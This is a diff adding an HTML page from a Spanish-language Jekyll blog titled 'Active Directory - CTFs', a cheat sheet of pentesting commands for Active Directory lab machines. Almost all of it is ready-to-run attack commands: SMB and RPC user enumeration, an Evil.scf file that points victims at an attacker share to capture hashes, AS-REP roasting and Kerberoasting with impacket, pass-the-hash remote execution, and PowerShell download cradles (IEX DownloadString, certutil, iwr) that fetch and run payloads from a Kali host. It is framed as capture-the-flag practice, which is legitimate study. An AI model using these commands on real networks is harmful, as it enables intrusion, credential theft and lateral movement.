@@ -1,0 +1,642 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Active Directory - CTFs - spoNge</title>
+<meta name="description" content="Comandos utiles para Pentesting en AD">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="spoNge">
+<meta property="og:title" content="Active Directory - CTFs">
+<meta property="og:url" content="http://localhost:4000/winAD/">
+
+
+  <meta property="og:description" content="Comandos utiles para Pentesting en AD">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/winAD/ad.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-04-14T00:00:00-04:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/winAD/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "spoNge",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="spoNge Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Active Directory - CTFs</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name"></h3>
+    
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Active Directory - CTFs">
+    <meta itemprop="description" content="Comandos utiles para Pentesting en AD">
+    <meta itemprop="datePublished" content="April 14, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Active Directory - CTFs
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-04-14T00:00:00-04:00">April 14, 2022 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/assets/images/winAD/tuxbreak.jpg" width="700" />
+</p>
+
+<p>Esta sera una lista de comandos para el Pentesting en entornos de Directorio Activo.</p>
+
+<h2 id="nmap">nmap</h2>
+
+<div class="code-header">
+    
+    
+    <div class="copy-code-container">
+        <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="nmap -sCV -p80 ... -oA nmap
+xsltproc nmap.xml
+php -S 0.0.0.0:80
+
+
+xsltproc -o scan.html bootstrap-net.xsl nmap.xml
+php -S 0.0.0.0:80" type="button"></button>
+    </div>
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> ... <span class="nt">-oA</span> nmap
+xsltproc nmap.xml
+php <span class="nt">-S</span> 0.0.0.0:80
+
+
+xsltproc <span class="nt">-o</span> scan.html bootstrap-net.xsl nmap.xml
+php <span class="nt">-S</span> 0.0.0.0:80
+</code></pre></div></div>
+
+<h2 id="port-21---ftp">Port 21 - ftp</h2>
+
+<div class="code-header">
+    
+    
+    <div class="copy-code-container">
+        <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="ftp IP_BOX #user:anonymous, password:ninguna
+ftp&gt; prompt off
+ftp&gt; mget *" type="button"></button>
+    </div>
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp IP_BOX <span class="c">#user:anonymous, password:ninguna</span>
+ftp&gt; prompt off
+ftp&gt; mget <span class="k">*</span>
+</code></pre></div></div>
+
+<h2 id="port-25---smtp">Port 25 - smtp</h2>
+<div class="code-header">
+    
+    
+    <div class="copy-code-container">
+        <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="#seclist-&gt;usershort.txt
+perl -wnlE&#39;print &quot;$_\@domain&quot;&#39; usershort.txt &gt; users.txt
+smtp-user-enum -M RCPT -U users.txt -t IP_BOX" type="button"></button>
+    </div>
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#seclist-&gt;usershort.txt</span>
+perl <span class="nt">-wnlE</span><span class="s1">'print "$_\@domain"'</span> usershort.txt <span class="o">&gt;</span> users.txt
+smtp-user-enum <span class="nt">-M</span> RCPT <span class="nt">-U</span> users.txt <span class="nt">-t</span> IP_BOX
+</code></pre></div></div>
+
+<h2 id="port-445---smb">Port 445 - smb</h2>
+
+<div class="code-header">
+    
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> IP_BOX <span class="nt">-N</span>
+smbmap <span class="nt">-H</span> IP_BOX <span class="nt">-u</span><span class="s1">'guest'</span>
+rpcclient <span class="nt">-U</span> <span class="s2">""</span> IP_BOX <span class="nt">-N</span>
+</code></pre></div></div>
+
+<div class="code-header">
+    
+    
+    <div class="copy-code-container">
+        <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rpcclient -U &quot;&quot; IP_BOX -N -c&quot;querydispinfo&quot; | perl -M&#39;Term::ANSIColor qw(:constants)&#39; -wnlE&#39;!/Desc:.+null/i and /(Account: .+).+(Name: .+).+(Desc: .+)/gi and print RED &quot;\n$1&quot;, BLUE, &quot;\n$2&quot;, GREEN, &quot;\n$3&quot;&#39;" type="button"></button>
+    </div>
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s2">""</span> IP_BOX <span class="nt">-N</span> <span class="nt">-c</span><span class="s2">"querydispinfo"</span> | perl <span class="nt">-M</span><span class="s1">'Term::ANSIColor qw(:constants)'</span> <span class="nt">-wnlE</span><span class="s1">'!/Desc:.+null/i and /(Account: .+).+(Name: .+).+(Desc: .+)/gi and print RED "\n$1", BLUE, "\n$2", GREEN, "\n$3"'</span>
+</code></pre></div></div>
+
+<div class="code-header">
+    
+    
+    <div class="copy-code-container">
+        <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rpcclient -U &quot;&quot; IP_target -N -c &quot;enumdomusers&quot; | perl -wnlE&#39;print $1 if/\[(\w+)\]/gi&#39; &gt; users.txt" type="button"></button>
+    </div>
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s2">""</span> IP_target <span class="nt">-N</span> <span class="nt">-c</span> <span class="s2">"enumdomusers"</span> | perl <span class="nt">-wnlE</span><span class="s1">'print $1 if/\[(\w+)\]/gi'</span> <span class="o">&gt;</span> users.txt
+</code></pre></div></div>
+
+<div class="code-header">
+    
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mount <span class="nt">-t</span> cifs <span class="s2">"//IP_BOX/Dir_share"</span> /mnt/mountAD
+tree <span class="nt">-fas</span> <span class="o">&gt;</span> users.txt
+<span class="nb">cat </span>users.txt | perl <span class="nt">-wnlE</span><span class="s1">'print $1 if/Users\/(\w+)/gi'</span> <span class="o">&gt;</span> users.txt
+perl <span class="nt">-M</span><span class="s1">'Term::ANSIColor qw(:constants)'</span> <span class="nt">-wnlE</span><span class="s1">'my $payload = `smbcacls \"//IP_BOX/Dir_shares\" /mnt/mountAD/Dir_share/Users/$_ -N`;print(BOLD BLUE "Usuario: $_", RED "\n$payload") if $payload=~/Everyone.*FULL/gi'</span> users.txt
+
+</code></pre></div></div>
+
+<div class="code-header">
+    
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-smbserver share <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+PS&gt; copy data.zip <span class="se">\\</span>IP_BOX<span class="se">\s</span>hare<span class="se">\d</span>ata.zip
+</code></pre></div></div>
+
+<h3 id="evilscf">Evil.scf</h3>
+<div class="code-header">
+    
+    
+    <div class="copy-code-container">
+        <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="[Shell]
+Command=2
+IconFile=\\IP_KALI\share\xd.ico
+[Taskbar]
+Command=ToggleDesktop" type="button"></button>
+    </div>
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Shell]
+<span class="nv">Command</span><span class="o">=</span>2
+<span class="nv">IconFile</span><span class="o">=</span><span class="se">\\</span>IP_KALI<span class="se">\s</span>hare<span class="se">\x</span>d.ico
+<span class="o">[</span>Taskbar]
+<span class="nv">Command</span><span class="o">=</span>ToggleDesktop
+</code></pre></div></div>
+
+<hr />
+
+<div class="code-header">
+    
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb IP_BOX
+crackmapexec smb IP_BOX <span class="nt">-u</span><span class="s1">'user'</span> <span class="nt">-p</span><span class="s1">'P@$$w0rd!'</span>
+crackmapexec winrm IP_BOX <span class="nt">-u</span><span class="s1">'user'</span> <span class="nt">-p</span><span class="s1">'P@$$w0rd!'</span>
+</code></pre></div></div>
+
+<div class="code-header">
+    
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">'domain\user%P@$$w0rd!'</span> IP_BOX <span class="nt">-c</span><span class="s1">'enumdomusers'</span>
+rpcclient <span class="nt">-U</span> <span class="s1">'domain\user%P@$$w0rd!'</span> IP_BOX <span class="nt">-c</span><span class="s1">'queryuser &lt;rid&gt;'</span>
+<span class="nt">-c</span><span class="s1">'enumdomgroups'</span>
+<span class="nt">-c</span><span class="s1">'querygroupmem &lt;rid&gt;'</span>
+</code></pre></div></div>
+
+<div class="code-header">
+    
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-u</span><span class="s1">'user'</span> <span class="nt">-p</span><span class="s1">'P@$$w0rd!'</span>
+</code></pre></div></div>
+
+<div class="code-header">
+    
+    
+    <div class="copy-code-container">
+        <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="rpcclient -U &#39;domain/user%P@$$w0rd!&#39; IP_BOX -c&quot;enumdomusers&quot; | perl -wnE&#39;say $1 if/\[(\w+)\]/gi&#39; &gt; users.txt
+impacket-GetNPUsers domain/ -no-pass -usersfile users.txt
+impacket-GetUserSPNs domain/user:&#39;P@$$w0rd!&#39; -request
+-dc-ip 127.0.0.1" type="button"></button>
+    </div>
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s1">'domain/user%P@$$w0rd!'</span> IP_BOX <span class="nt">-c</span><span class="s2">"enumdomusers"</span> | perl <span class="nt">-wnE</span><span class="s1">'say $1 if/\[(\w+)\]/gi'</span> <span class="o">&gt;</span> users.txt
+impacket-GetNPUsers domain/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
+impacket-GetUserSPNs domain/user:<span class="s1">'P@$$w0rd!'</span> <span class="nt">-request</span>
+<span class="nt">-dc-ip</span> 127.0.0.1
+</code></pre></div></div>
+
+<div class="code-header">
+    
+    
+    <div class="copy-code-container">
+        <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="impacket-psexec domain/user:&#39;Passw0rd!&#39;@IP_BOX cmd.exe
+impacket-wmiexec domain/user@IP_BOX -hashes LMHASH:NTHASH" type="button"></button>
+    </div>
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-psexec domain/user:<span class="s1">'Passw0rd!'</span>@IP_BOX cmd.exe
+impacket-wmiexec domain/user@IP_BOX <span class="nt">-hashes</span> LMHASH:NTHASH
+</code></pre></div></div>
+
+<h2 id="powershell">Powershell</h2>
+
+<div class="code-header">
+    
+    
+</div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>IEX<span class="o">(</span>New-Object Net.WebClient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">'http://IP_KALI/sponge.ps1'</span><span class="o">)</span>
+wget http://IP_KALI/sponge.exe <span class="nt">-OutFile</span> sponge.exe
+iwr <span class="nt">-uri</span> http://IP_KALI/sponge.exe <span class="nt">-o</span> sponge.exe
+certutil <span class="nt">-urlcache</span> <span class="nt">-f</span> http://IP_KALI/sponge.exe sponge.exe
+curl http://IP_KALI/sponge.exe <span class="nt">-o</span> sponge.exe
+<span class="o">(</span>New-Object System.Net.WebClient<span class="o">)</span>.DownloadFile<span class="o">(</span><span class="s1">'http://IP_KALI/sponge.exe'</span>,<span class="s1">'sponge.exe'</span><span class="o">)</span>
+</code></pre></div></div>
+
+<div class="code-header">
+    
+    
+    <div class="copy-code-container">
+        <button class="copy-code-button" aria-label="Copy code block to your clipboard" data-code="$ExecutionContext.SessionState.LanguageMode" type="button"></button>
+    </div>
+    
+</div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">$ExecutionContext</span><span class="o">.</span><span class="nf">SessionState</span><span class="o">.</span><span class="nf">LanguageMode</span><span class="w">
+</span></code></pre></div></div>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#ad" class="page__taxonomy-item" rel="tag">AD</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ad" class="page__taxonomy-item" rel="tag">AD</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#winad" class="page__taxonomy-item" rel="tag">winAD</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-04-14T00:00:00-04:00">April 14, 2022</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/perlbettergrep/" class="pagination--pager" title="Perl as a Better grep - Linux
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+
+<script src="/assets/scripts/copyCode.js"></script>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 spoNge</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  </body>
+</html>
